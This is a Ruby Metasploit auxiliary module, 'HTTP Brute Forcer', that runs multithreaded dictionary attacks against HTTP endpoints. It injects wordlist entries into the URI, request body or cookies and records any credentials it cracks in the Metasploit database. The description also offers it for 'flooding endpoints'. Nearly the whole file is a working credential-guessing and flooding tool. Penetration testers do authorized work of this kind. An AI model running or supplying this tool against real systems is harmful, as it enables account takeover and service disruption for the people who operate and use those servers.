require 'msf/core'
# require 'thread'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  # include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HTTP Brute Forcer',
      'Description' => %q{
        This module performs multi-threads Brute-Force attacks against HTTP(S) using customizable payload and success/failure/retry criteria.
		The Brute-Force point is specified by the string \'^INJECTION^\' placed anywhere within the URI, DATA, or the COOKIE.
		This module can be used to discover webserver paths, to guess credentials, or to flood endpoints.
		if FAILURE_HTTP_CODE is defined then
			if FAILURE_HTTP_CODE contains HTTP response code then
				FAILURE
			else
				SUCCESS.
		elseif SUCCESS_HTTP_CODE is defined then
			if SUCCESS_HTTP_CODE contains HTTP response code then 
				SUCCESS
			else
				FAILURE
		elseif SUCCESS_RESPONSE is defined then 
			if http response body contains SUCCESS_RESPONSE then
				SUCCESS
			else
				FAILURE
		
      },
      'Author'      => ['Jeremyc'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(80),
      OptBool.new('SSL', [true, 'Negotiate SSL for outgoing connections', false]),
      OptString.new('TARGETURI', [true, 'URI, can include \'^INJECTION^\'', '/login']),
      OptString.new('VHOST', [false, 'HTTP server virtual host']),
      OptString.new('DATA', [true, 'The request body, can include \'^INJECTION^\'']),
      OptString.new('COOKIE', [false, 'The Cookies, can include \'^INJECTION^\'']),
      OptString.new('INJECTION_FILE', [true, 'Path to the file containing the injection dictionary']),
      OptString.new('CONTENT_TYPE', [true, 'application/x-www-form-urlencoded - application/json', 'application/json']),
      OptString.new('HTTP_METHOD', [true, 'POST, PUT or anything else but make sure your request makes sense', 'POST']),
      OptInt.new('SUCCESS_HTTP_CODE', [false, 'HTTP code to treat as success', nil]),
      OptInt.new('START_FROM_OFFSET', [false, 'If set, will start bruteforce from this offset in file', nil]),
      OptString.new('FAILURE_HTTP_CODE', [false, 'HTTP code(s) to treat as failure. Comma separated if multiple', nil]),
	  OptString.new('RETRY_HTTP_CODE', [false, 'HTTP code(s) to treat as retry. Comma separated if multiple', "500"]),
      OptInt.new('VERBOSE_LEVEL', [true, 'Control the level of verbosity (0-2)', 2]),
      OptString.new('SUCCESS_RESPONSE', [false, 'String in the response to treat as success', nil]),
      OptBool.new('STOP_ON_SUCCESS', [true, 'Stop brute force when success is evaluated', true]),
      OptInt.new('BRUTEFORCE_SPEED', [true, 'Milliseconds to wait between brute force attempts', 0]),
      OptInt.new('RETRIES', [true, 'How many times to retry if no answer or if RETRY_HTTP_CODE received', 3])
    ])
  end

  def stop_threads
	@stop = true
    if @input_thread&.alive?
      print_status("Killing Verbose Thread...")
      @input_thread.kill
    end
  end

  def run_host(ip)
    unless datastore['SUCCESS_HTTP_CODE'] || datastore['SUCCESS_RESPONSE'] || datastore['FAILURE_HTTP_CODE']
        fail_with(Failure::BadConfig, "Either SUCCESS_HTTP_CODE, SUCCESS_RESPONSE, or FAILURE_HTTP_CODE must be set to run the module.")
    end
    fail_with(Failure::NoTarget, 'No database access. Cannot retrieve workspace.') unless framework.db.active

    Signal.trap("INT") {
      print_status("Caught interrupt, stopping threads...")
      stop_threads
      raise Interrupt   # Re-raise the interrupt to allow Metasploit to handle it gracefully
    }

    # Asynchronous task for verbose on key pressed
    $last_attempt = nil
    if datastore['VERBOSE_LEVEL'] == 1
      print_status("Verbose Level 1 thread started")
      @input_thread = Thread.new do
        loop do
          if $stdin.gets && $last_attempt
            print_status($last_attempt)
			$mutexT1.synchronize do
				$last_attempt = nil  # Reset after displaying to avoid repeats
			end
          end
          sleep 0.2  # Small sleep to prevent high CPU usage
        end
      end
    end

    print_status("Bruteforce started...")
    $total_entries = File.read(datastore['INJECTION_FILE']).lines.count
    $bf_index = 0
	$bf_success = false
	$bf_success_data = {}
	$mutexT1 = Mutex.new
	$mutexT2 = Mutex.new
	$retry_codes = parse_failure_codes(datastore['RETRY_HTTP_CODE'])
	start_offset = datastore['START_FROM_OFFSET']&.to_i
	
	num_threads = datastore['THREADS']
	queue = Queue.new
	File.readlines(datastore['INJECTION_FILE']).each_with_index do |line, index|
		queue.push(line.strip) if start_offset.nil? || index >= start_offset
	end
	if start_offset != nil
		$bf_index = start_offset
	end
	
	threads = []
	
	num_threads.times do |thread_index|
		threads << Thread.new(thread_index) do |my_index|
			while !queue.empty? && !@stop
				injected_data = ""
				line = ""
				$mutexT2.synchronize do
					line = queue.pop(true) rescue nil
					next unless line

					injected_data = datastore['DATA'].gsub('^INJECTION^', line)
					$bf_index += 1
				end
				fail_retry_thread = 0
				if perform_bruteforce(injected_data, line, my_index, fail_retry_thread)
					$mutexT2.synchronize do
						$bf_success=true
						$bf_success_data = {
							payload: injected_data,
							line: line
						}
						report_success()
						if datastore['STOP_ON_SUCCESS']
							@stop = true
						end
					end
				end
				select(nil, nil, nil, datastore['BRUTEFORCE_SPEED'] / 1000.0)
			end
		end
	end
	
	# Wait for all threads to finish
	threads.each(&:join)
	
	if $bf_success
		report_success()
	end

    stop_threads  # Ensure the input thread is stopped at the end if it was started
  end
	
	def report_success()
		cred = create_credential({
			workspace_id: myworkspace_id,
			origin_type: :service,
			module_fullname: fullname,
			username: '',  # empty in our case
			private_data: $bf_success_data['line'],  # the successful injection key word
			private_type: :password,
			service_name: 'http',
			address: rhost,
			port: rport,
			protocol: 'tcp'
		})
		create_credential_login({
			workspace_id: myworkspace_id,
			core: cred,
			status: Metasploit::Model::Login::Status::SUCCESSFUL,
			last_attempted_at: DateTime.now,
			address: rhost,
			service_name: 'http',
			port: rport,
			protocol: 'tcp'
		})

		report_note({
			host: rhost,
			type: 'http_bruteforce_details',
			data: {
				vhost: datastore['VHOST'],
				uri: target_uri,
				injection: $bf_success_data['line']
				},
			port: rport,
			proto: 'tcp',
			service: 'http'
		})
	end
	
	def perform_bruteforce(injected_data, line, thread_index, fail_retry)
		
		if fail_retry >= datastore['RETRIES'] 
			print_error("#{$bf_index}/#{$total_entries} | T#{thread_index} | #{line} | Got " + datastore['RETRIES'].to_s + " unsuccessful attempt(s) in a row... Bruteforce aborted !")
			stop_threads
			fail_with(Failure::Unreachable, "No response " + datastore['RETRIES'].to_s + " times, server down? Exit..." )
		end
		
		response = send_request_cgi({
			'uri'    => target_uri.to_s.gsub('^INJECTION^', line),
			'method' => datastore['HTTP_METHOD'],
			'ctype'  => datastore['CONTENT_TYPE'],
			'data'   => injected_data,
			'headers' => {
				  'Cookie' => datastore['COOKIE']&.to_s.gsub('^INJECTION^', line)
			}
		})
		
		unless response
			
			fail_retry += 1
			print_error("#{$bf_index}/#{$total_entries} | T#{thread_index} | #{line} | No response received... (" + fail_retry.to_s + ")")

			return perform_bruteforce(injected_data, line, thread_index, fail_retry)
		end
		
		
		if $retry_codes.include?(response.code)
			fail_retry += 1
			print_error("#{$bf_index}/#{$total_entries} | T#{thread_index} | #{line} | Retry Code: " + response.code.to_s + " (" + fail_retry.to_s + ")")

			return perform_bruteforce(injected_data, line, thread_index, fail_retry)
		end
		

		# print_status("Response: " + response.body)
		$last_attempt = "#{$bf_index}/#{$total_entries} | T#{thread_index} | #{line} | Response Code: " + response.code.to_s + " | Body: " + response.body[0..100].gsub(/\s\w+\s*$/,'...')
		print_status($last_attempt) if datastore['VERBOSE_LEVEL'] == 2

		if valid_response?(response)
			print_good("Successful injection with payload: #{injected_data}")
			print_good("Success Response Code: " + response.code.to_s + ", Body: " + response.body[0..100].gsub(/\s\w+\s*$/,'...'))
			return true
		end
		return false
	end
	
	def parse_failure_codes(failure_code_string)
		return [] unless failure_code_string
		if failure_code_string.class != "string"
			failure_code_string = failure_code_string.to_s
		end
		failure_code_string.split(',').map(&:to_i)
	end
	
	def valid_response?(response)

		# Check failure codes first if they are defined
		if datastore['FAILURE_HTTP_CODE']
			failure_codes = parse_failure_codes(datastore['FAILURE_HTTP_CODE'])
			return false if failure_codes.include?(response.code)
			return true
		end

		# Next, check for SUCCESS_HTTP_CODE if FAILURE_HTTP_CODE is not set or doesn't lead to success
		if datastore['SUCCESS_HTTP_CODE']
			return true if response.code == datastore['SUCCESS_HTTP_CODE']
			return false
		end

		# Finally, check for SUCCESS_RESPONSE if neither of the HTTP codes led to a determination
		if datastore['SUCCESS_RESPONSE']
			return true if response.body.include?(datastore['SUCCESS_RESPONSE'])
			return false
		end

		# If none of the conditions are met, default to not success
		false
	end

end
